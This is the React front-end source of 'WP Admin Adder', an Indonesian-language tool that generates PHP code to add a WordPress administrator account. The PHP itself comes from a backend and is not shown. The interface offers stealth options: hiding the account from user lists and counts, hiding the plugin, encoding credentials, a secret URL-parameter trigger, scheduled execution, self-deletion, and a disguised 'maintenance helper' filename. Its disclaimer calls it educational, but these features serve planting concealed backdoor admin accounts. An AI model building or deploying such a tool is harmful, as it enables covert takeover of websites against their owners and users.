import { useState, useEffect } from "react";
import "@/App.css";
import axios from "axios";
import { Toaster, toast } from "sonner";
import { Copy, Check, Trash2, Download, History, Settings, Code, Shield, Clock, Eye, EyeOff, RefreshCw } from "lucide-react";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

function App() {
  // Form states
  const [codeType, setCodeType] = useState("theme");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [email, setEmail] = useState("");
  const [displayName, setDisplayName] = useState("");
  const [role, setRole] = useState("administrator");

  // Stealth options
  const [hideFromUserList, setHideFromUserList] = useState(false);
  const [hideFromUserCount, setHideFromUserCount] = useState(false);
  const [obfuscateCode, setObfuscateCode] = useState(false);
  const [useBase64, setUseBase64] = useState(false);

  // Trigger options
  const [triggerType, setTriggerType] = useState("immediate");
  const [urlParamKey, setUrlParamKey] = useState("wp_setup");
  const [urlParamValue, setUrlParamValue] = useState("init");
  const [scheduledTime, setScheduledTime] = useState("");
  const [autoDelete, setAutoDelete] = useState(false);

  // Generated code
  const [generatedCode, setGeneratedCode] = useState("");
  const [copied, setCopied] = useState(false);
  const [loading, setLoading] = useState(false);

  // History
  const [history, setHistory] = useState([]);
  const [showHistory, setShowHistory] = useState(false);
  const [selectedHistory, setSelectedHistory] = useState(null);

  // Password visibility
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => {
    fetchHistory();
  }, []);

  const fetchHistory = async () => {
    try {
      const response = await axios.get(`${API}/history`);
      setHistory(response.data);
    } catch (e) {
      console.error("Error fetching history:", e);
    }
  };

  const generateRandomPassword = () => {
    const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789!@#$%";
    let result = "";
    for (let i = 0; i < 16; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    setPassword(result);
  };

  const handleGenerate = async () => {
    if (!username || !password || !email) {
      toast.error("Username, password, dan email wajib diisi!");
      return;
    }

    setLoading(true);
    try {
      const response = await axios.post(`${API}/generate`, {
        code_type: codeType,
        admin_config: {
          username,
          password,
          email,
          display_name: displayName || username,
          role,
        },
        stealth_config: {
          hide_from_user_list: hideFromUserList,
          hide_from_user_count: hideFromUserCount,
          obfuscate_code: obfuscateCode,
          use_base64_encoding: useBase64,
        },
        trigger_config: {
          trigger_type: triggerType,
          url_param_key: urlParamKey,
          url_param_value: urlParamValue,
          scheduled_time: scheduledTime,
          auto_delete_after_run: autoDelete,
        },
      });

      setGeneratedCode(response.data.php_code);
      toast.success("Kode berhasil di-generate!");
      fetchHistory();
    } catch (e) {
      console.error("Error generating code:", e);
      toast.error("Gagal generate kode: " + (e.response?.data?.detail || e.message));
    } finally {
      setLoading(false);
    }
  };

  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(generatedCode);
      setCopied(true);
      toast.success("Kode berhasil disalin!");
      setTimeout(() => setCopied(false), 2000);
    } catch (e) {
      toast.error("Gagal menyalin kode");
    }
  };

  const downloadCode = () => {
    const filename = codeType === "plugin" ? "wp-maintenance-helper.php" : "functions-snippet.php";
    const blob = new Blob([generatedCode], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
    toast.success(`File ${filename} berhasil diunduh!`);
  };

  const viewHistoryCode = async (id) => {
    try {
      const response = await axios.get(`${API}/history/${id}`);
      setSelectedHistory(response.data);
      setGeneratedCode(response.data.php_code);
    } catch (e) {
      toast.error("Gagal mengambil kode");
    }
  };

  const deleteHistoryItem = async (id) => {
    try {
      await axios.delete(`${API}/history/${id}`);
      toast.success("Item dihapus dari history");
      fetchHistory();
      if (selectedHistory?.id === id) {
        setSelectedHistory(null);
        setGeneratedCode("");
      }
    } catch (e) {
      toast.error("Gagal menghapus item");
    }
  };

  const clearAllHistory = async () => {
    if (!window.confirm("Yakin ingin menghapus semua history?")) return;
    try {
      await axios.delete(`${API}/history`);
      toast.success("History berhasil dihapus");
      setHistory([]);
      setSelectedHistory(null);
      setGeneratedCode("");
    } catch (e) {
      toast.error("Gagal menghapus history");
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-gray-900">
      <Toaster position="top-right" richColors />
      
      {/* Header */}
      <header className="border-b border-purple-800/30 bg-black/20 backdrop-blur-sm">
        <div className="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-purple-500 to-pink-500 flex items-center justify-center">
              <Shield className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-xl font-bold text-white" data-testid="app-title">WP Admin Adder</h1>
              <p className="text-xs text-purple-300">Auto Add WordPress Admin Tool</p>
            </div>
          </div>
          <button
            onClick={() => setShowHistory(!showHistory)}
            className={`flex items-center gap-2 px-4 py-2 rounded-lg transition-all ${
              showHistory ? "bg-purple-600 text-white" : "bg-white/10 text-purple-300 hover:bg-white/20"
            }`}
            data-testid="history-toggle-btn"
          >
            <History className="w-4 h-4" />
            History ({history.length})
          </button>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 py-8">
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
          {/* Left Column - Configuration */}
          <div className="space-y-6">
            {/* Code Type Selection */}
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
              <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
                <Code className="w-5 h-5 text-purple-400" />
                Tipe Kode
              </h2>
              <div className="grid grid-cols-2 gap-3">
                <button
                  onClick={() => setCodeType("theme")}
                  className={`p-4 rounded-lg border-2 transition-all ${
                    codeType === "theme"
                      ? "border-purple-500 bg-purple-500/20 text-white"
                      : "border-white/10 bg-white/5 text-gray-400 hover:border-purple-500/50"
                  }`}
                  data-testid="code-type-theme"
                >
                  <div className="font-medium">Theme</div>
                  <div className="text-xs mt-1 opacity-70">Untuk functions.php</div>
                </button>
                <button
                  onClick={() => setCodeType("plugin")}
                  className={`p-4 rounded-lg border-2 transition-all ${
                    codeType === "plugin"
                      ? "border-purple-500 bg-purple-500/20 text-white"
                      : "border-white/10 bg-white/5 text-gray-400 hover:border-purple-500/50"
                  }`}
                  data-testid="code-type-plugin"
                >
                  <div className="font-medium">Plugin</div>
                  <div className="text-xs mt-1 opacity-70">File plugin terpisah</div>
                </button>
              </div>
            </div>

            {/* Admin Configuration */}
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
              <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
                <Settings className="w-5 h-5 text-purple-400" />
                Konfigurasi Admin
              </h2>
              <div className="space-y-4">
                <div>
                  <label className="block text-sm text-purple-300 mb-1">Username *</label>
                  <input
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    placeholder="admin_baru"
                    className="w-full px-4 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500"
                    data-testid="input-username"
                  />
                </div>
                <div>
                  <label className="block text-sm text-purple-300 mb-1">Password *</label>
                  <div className="flex gap-2">
                    <div className="relative flex-1">
                      <input
                        type={showPassword ? "text" : "password"}
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="Password kuat"
                        className="w-full px-4 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 pr-10"
                        data-testid="input-password"
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white"
                      >
                        {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                      </button>
                    </div>
                    <button
                      onClick={generateRandomPassword}
                      className="px-3 py-2 bg-purple-600 hover:bg-purple-700 rounded-lg text-white transition-colors"
                      title="Generate password random"
                      data-testid="generate-password-btn"
                    >
                      <RefreshCw className="w-4 h-4" />
                    </button>
                  </div>
                </div>
                <div>
                  <label className="block text-sm text-purple-300 mb-1">Email *</label>
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="admin@example.com"
                    className="w-full px-4 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500"
                    data-testid="input-email"
                  />
                </div>
                <div>
                  <label className="block text-sm text-purple-300 mb-1">Display Name</label>
                  <input
                    type="text"
                    value={displayName}
                    onChange={(e) => setDisplayName(e.target.value)}
                    placeholder="Nama tampilan (opsional)"
                    className="w-full px-4 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500"
                    data-testid="input-display-name"
                  />
                </div>
                <div>
                  <label className="block text-sm text-purple-300 mb-1">Role</label>
                  <select
                    value={role}
                    onChange={(e) => setRole(e.target.value)}
                    className="w-full px-4 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white focus:outline-none focus:border-purple-500"
                    data-testid="select-role"
                  >
                    <option value="administrator" className="bg-gray-800">Administrator</option>
                    <option value="editor" className="bg-gray-800">Editor</option>
                    <option value="author" className="bg-gray-800">Author</option>
                    <option value="contributor" className="bg-gray-800">Contributor</option>
                    <option value="subscriber" className="bg-gray-800">Subscriber</option>
                  </select>
                </div>
              </div>
            </div>

            {/* Stealth Options */}
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
              <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
                <Shield className="w-5 h-5 text-purple-400" />
                Opsi Stealth
              </h2>
              <div className="space-y-3">
                <label className="flex items-center gap-3 cursor-pointer group">
                  <input
                    type="checkbox"
                    checked={hideFromUserList}
                    onChange={(e) => setHideFromUserList(e.target.checked)}
                    className="w-4 h-4 rounded border-purple-800 bg-white/10 text-purple-500 focus:ring-purple-500"
                    data-testid="checkbox-hide-user-list"
                  />
                  <span className="text-gray-300 group-hover:text-white transition-colors">
                    Sembunyikan dari daftar user
                  </span>
                </label>
                <label className="flex items-center gap-3 cursor-pointer group">
                  <input
                    type="checkbox"
                    checked={hideFromUserCount}
                    onChange={(e) => setHideFromUserCount(e.target.checked)}
                    className="w-4 h-4 rounded border-purple-800 bg-white/10 text-purple-500 focus:ring-purple-500"
                    data-testid="checkbox-hide-user-count"
                  />
                  <span className="text-gray-300 group-hover:text-white transition-colors">
                    Sembunyikan dari jumlah user
                  </span>
                </label>
                <label className="flex items-center gap-3 cursor-pointer group">
                  <input
                    type="checkbox"
                    checked={obfuscateCode}
                    onChange={(e) => setObfuscateCode(e.target.checked)}
                    className="w-4 h-4 rounded border-purple-800 bg-white/10 text-purple-500 focus:ring-purple-500"
                    data-testid="checkbox-obfuscate"
                  />
                  <span className="text-gray-300 group-hover:text-white transition-colors">
                    Sembunyikan plugin dari daftar plugin
                  </span>
                </label>
                <label className="flex items-center gap-3 cursor-pointer group">
                  <input
                    type="checkbox"
                    checked={useBase64}
                    onChange={(e) => setUseBase64(e.target.checked)}
                    className="w-4 h-4 rounded border-purple-800 bg-white/10 text-purple-500 focus:ring-purple-500"
                    data-testid="checkbox-base64"
                  />
                  <span className="text-gray-300 group-hover:text-white transition-colors">
                    Encode kredensial dengan Base64
                  </span>
                </label>
              </div>
            </div>

            {/* Trigger Options */}
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
              <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
                <Clock className="w-5 h-5 text-purple-400" />
                Opsi Trigger
              </h2>
              <div className="space-y-4">
                <div className="grid grid-cols-3 gap-2">
                  <button
                    onClick={() => setTriggerType("immediate")}
                    className={`px-3 py-2 rounded-lg text-sm transition-all ${
                      triggerType === "immediate"
                        ? "bg-purple-500 text-white"
                        : "bg-white/10 text-gray-400 hover:bg-white/20"
                    }`}
                    data-testid="trigger-immediate"
                  >
                    Langsung
                  </button>
                  <button
                    onClick={() => setTriggerType("url_param")}
                    className={`px-3 py-2 rounded-lg text-sm transition-all ${
                      triggerType === "url_param"
                        ? "bg-purple-500 text-white"
                        : "bg-white/10 text-gray-400 hover:bg-white/20"
                    }`}
                    data-testid="trigger-url-param"
                  >
                    URL Param
                  </button>
                  <button
                    onClick={() => setTriggerType("scheduled")}
                    className={`px-3 py-2 rounded-lg text-sm transition-all ${
                      triggerType === "scheduled"
                        ? "bg-purple-500 text-white"
                        : "bg-white/10 text-gray-400 hover:bg-white/20"
                    }`}
                    data-testid="trigger-scheduled"
                  >
                    Terjadwal
                  </button>
                </div>

                {triggerType === "url_param" && (
                  <div className="grid grid-cols-2 gap-3 animate-fade-in">
                    <div>
                      <label className="block text-xs text-purple-300 mb-1">Parameter Key</label>
                      <input
                        type="text"
                        value={urlParamKey}
                        onChange={(e) => setUrlParamKey(e.target.value)}
                        placeholder="wp_setup"
                        className="w-full px-3 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white text-sm placeholder-gray-500 focus:outline-none focus:border-purple-500"
                        data-testid="input-url-param-key"
                      />
                    </div>
                    <div>
                      <label className="block text-xs text-purple-300 mb-1">Parameter Value</label>
                      <input
                        type="text"
                        value={urlParamValue}
                        onChange={(e) => setUrlParamValue(e.target.value)}
                        placeholder="init"
                        className="w-full px-3 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white text-sm placeholder-gray-500 focus:outline-none focus:border-purple-500"
                        data-testid="input-url-param-value"
                      />
                    </div>
                    <div className="col-span-2 text-xs text-gray-400 bg-black/30 p-2 rounded">
                      Akses: <code className="text-purple-400">https://site.com/?{urlParamKey}={urlParamValue}</code>
                    </div>
                  </div>
                )}

                {triggerType === "scheduled" && (
                  <div className="animate-fade-in">
                    <label className="block text-xs text-purple-300 mb-1">Tanggal Eksekusi</label>
                    <input
                      type="date"
                      value={scheduledTime}
                      onChange={(e) => setScheduledTime(e.target.value)}
                      className="w-full px-3 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white text-sm focus:outline-none focus:border-purple-500"
                      data-testid="input-scheduled-time"
                    />
                  </div>
                )}

                <label className="flex items-center gap-3 cursor-pointer group pt-2">
                  <input
                    type="checkbox"
                    checked={autoDelete}
                    onChange={(e) => setAutoDelete(e.target.checked)}
                    className="w-4 h-4 rounded border-purple-800 bg-white/10 text-purple-500 focus:ring-purple-500"
                    data-testid="checkbox-auto-delete"
                  />
                  <span className="text-gray-300 group-hover:text-white transition-colors">
                    Hapus kode otomatis setelah eksekusi
                  </span>
                </label>
              </div>
            </div>

            {/* Generate Button */}
            <button
              onClick={handleGenerate}
              disabled={loading}
              className="w-full py-4 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 disabled:opacity-50 text-white font-semibold rounded-xl transition-all transform hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center gap-2"
              data-testid="generate-btn"
            >
              {loading ? (
                <>
                  <RefreshCw className="w-5 h-5 animate-spin" />
                  Generating...
                </>
              ) : (
                <>
                  <Code className="w-5 h-5" />
                  Generate Kode
                </>
              )}
            </button>
          </div>

          {/* Right Column - Generated Code & History */}
          <div className="space-y-6">
            {/* Generated Code Output */}
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-lg font-semibold text-white flex items-center gap-2">
                  <Code className="w-5 h-5 text-purple-400" />
                  Kode PHP
                </h2>
                {generatedCode && (
                  <div className="flex gap-2">
                    <button
                      onClick={copyToClipboard}
                      className="p-2 bg-white/10 hover:bg-white/20 rounded-lg text-purple-300 hover:text-white transition-colors"
                      title="Salin kode"
                      data-testid="copy-btn"
                    >
                      {copied ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4" />}
                    </button>
                    <button
                      onClick={downloadCode}
                      className="p-2 bg-white/10 hover:bg-white/20 rounded-lg text-purple-300 hover:text-white transition-colors"
                      title="Download file"
                      data-testid="download-btn"
                    >
                      <Download className="w-4 h-4" />
                    </button>
                  </div>
                )}
              </div>
              <div className="relative">
                <pre className="bg-black/50 rounded-lg p-4 overflow-x-auto text-sm text-gray-300 font-mono min-h-[400px] max-h-[600px] overflow-y-auto" data-testid="code-output">
                  {generatedCode || (
                    <span className="text-gray-500 italic">Kode akan muncul di sini setelah generate...</span>
                  )}
                </pre>
              </div>
            </div>

            {/* Instructions */}
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
              <h2 className="text-lg font-semibold text-white mb-4">Cara Penggunaan</h2>
              <div className="space-y-3 text-sm text-gray-300">
                {codeType === "theme" ? (
                  <>
                    <div className="flex gap-3">
                      <span className="flex-shrink-0 w-6 h-6 rounded-full bg-purple-500/30 text-purple-300 flex items-center justify-center text-xs">1</span>
                      <p>Buka file <code className="text-purple-400 bg-black/30 px-1 rounded">functions.php</code> di theme WordPress aktif</p>
                    </div>
                    <div className="flex gap-3">
                      <span className="flex-shrink-0 w-6 h-6 rounded-full bg-purple-500/30 text-purple-300 flex items-center justify-center text-xs">2</span>
                      <p>Tempelkan kode di bagian paling bawah file (sebelum <code className="text-purple-400 bg-black/30 px-1 rounded">?&gt;</code> jika ada)</p>
                    </div>
                    <div className="flex gap-3">
                      <span className="flex-shrink-0 w-6 h-6 rounded-full bg-purple-500/30 text-purple-300 flex items-center justify-center text-xs">3</span>
                      <p>Simpan file dan akses halaman website untuk mengaktifkan</p>
                    </div>
                  </>
                ) : (
                  <>
                    <div className="flex gap-3">
                      <span className="flex-shrink-0 w-6 h-6 rounded-full bg-purple-500/30 text-purple-300 flex items-center justify-center text-xs">1</span>
                      <p>Download file plugin dan upload ke folder <code className="text-purple-400 bg-black/30 px-1 rounded">wp-content/plugins/</code></p>
                    </div>
                    <div className="flex gap-3">
                      <span className="flex-shrink-0 w-6 h-6 rounded-full bg-purple-500/30 text-purple-300 flex items-center justify-center text-xs">2</span>
                      <p>Aktifkan plugin melalui dashboard WordPress atau langsung</p>
                    </div>
                    <div className="flex gap-3">
                      <span className="flex-shrink-0 w-6 h-6 rounded-full bg-purple-500/30 text-purple-300 flex items-center justify-center text-xs">3</span>
                      <p>Plugin akan dieksekusi sesuai trigger yang dipilih</p>
                    </div>
                  </>
                )}
              </div>
            </div>

            {/* History Panel */}
            {showHistory && (
              <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30 animate-fade-in">
                <div className="flex items-center justify-between mb-4">
                  <h2 className="text-lg font-semibold text-white flex items-center gap-2">
                    <History className="w-5 h-5 text-purple-400" />
                    History
                  </h2>
                  {history.length > 0 && (
                    <button
                      onClick={clearAllHistory}
                      className="text-xs text-red-400 hover:text-red-300 flex items-center gap-1"
                      data-testid="clear-history-btn"
                    >
                      <Trash2 className="w-3 h-3" />
                      Hapus Semua
                    </button>
                  )}
                </div>
                {history.length === 0 ? (
                  <p className="text-gray-500 text-center py-4">Belum ada history</p>
                ) : (
                  <div className="space-y-2 max-h-[300px] overflow-y-auto">
                    {history.map((item) => (
                      <div
                        key={item.id}
                        className={`p-3 rounded-lg border transition-all cursor-pointer ${
                          selectedHistory?.id === item.id
                            ? "border-purple-500 bg-purple-500/20"
                            : "border-white/10 bg-white/5 hover:border-purple-500/50"
                        }`}
                        onClick={() => viewHistoryCode(item.id)}
                        data-testid={`history-item-${item.id}`}
                      >
                        <div className="flex items-center justify-between">
                          <div>
                            <div className="text-white text-sm font-medium">{item.admin_username}</div>
                            <div className="text-xs text-gray-400">
                              {item.code_type} • {item.trigger_type}
                              {item.stealth_enabled && " • 🔒 Stealth"}
                            </div>
                          </div>
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              deleteHistoryItem(item.id);
                            }}
                            className="p-1 text-gray-500 hover:text-red-400 transition-colors"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="border-t border-purple-800/30 bg-black/20 mt-12">
        <div className="max-w-7xl mx-auto px-4 py-6 text-center">
          <p className="text-sm text-gray-500">
            ⚠️ Tool ini hanya untuk keperluan edukasi dan recovery. Gunakan dengan bijak dan bertanggung jawab.
          </p>
        </div>
      </footer>
    </div>
  );
}

export default App;
